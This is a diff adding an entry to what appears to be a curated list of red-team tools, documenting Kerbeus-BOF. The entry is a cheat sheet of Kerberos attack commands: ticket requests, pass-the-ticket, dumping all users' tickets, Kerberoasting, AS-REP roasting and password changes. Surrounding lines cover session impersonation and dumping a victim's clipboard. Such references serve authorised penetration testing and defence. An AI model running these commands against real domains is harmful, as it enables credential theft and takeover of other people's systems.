@@ -249,6 +249,36 @@ koh impersonate <LUID> --> Impersonate a logon session from above output
 ls \\dc.theshire.local\C$ --> Use the impersonated privileged logon session to interact with a target system
 ```
 
+- [**Kerbeus-BOF**](https://github.com/RalfHacker/Kerbeus-BOF)
+The first Rubeus BOF implementation released in November 2023 which has integration with Cobalt Strike and Havoc!<br />
+```
+help kerbeus --> Show help menu
+
+# Ticket requests
+krb_asktgt /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec] --> Ask TGT
+- krb_asktgt /usr:domainadmin /password:SuperSecure123
+krb_asktgs /ticket:BASE64 /service:SPN1,SPN2 [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec] --> Ask TGS
+- krb_asktgs /ticket:<BASE64> /service:HTTP/dc1.domain.com,CIFS/dc1.domain.com /opsec
+krb_renew /ticket:BASE64 [/dc:DC] [/ptt] --> Renew TGT
+
+# Ticket management
+krb_ptt /ticket:BASE64 [/luid:LOGONID] --> Pass-the-ticket in current logon session
+krb_purge [/luid:LOGONID] --> Purge all tickets or specific ticket
+krb_describe /ticket:BASE64 --> Describe a ticket
+krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] --> Klist command to list tickets
+krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] --> Dump tickets for current user (non-privileged) or for all users (requires SYSTEM)
+krb_triage [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] --> Output table of all tickets
+krb_tgtdeleg [/target:SPN] --> Get current user ticket from memory without requiring admin privs
+
+# Roasting
+krb_kerberoasting /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN] --> Kerberoast
+krb_asreproasting /user:USER [/dc:DC] [/domain:DOMAIN] --> AS-REP roast
+
+# Miscellaneous
+krb_hash /password:PASSWORD [/user:USER] [/domain:DOMAIN] --> Generate RC4-hmac (NTLM) hash of password
+krb_changepw /ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN] --> Change current user password using MS kpasswd password change
+```
+
 - [**Cobalt-Clip**](https://github.com/DallasFR/Cobalt-Clip)<br />
 A clipboard add-on for Cobalt Strike to interact with the victim's clipboard. With Cobalt-Clip you can dump, edit and monitor the content of a clipboard.<br />
 ```
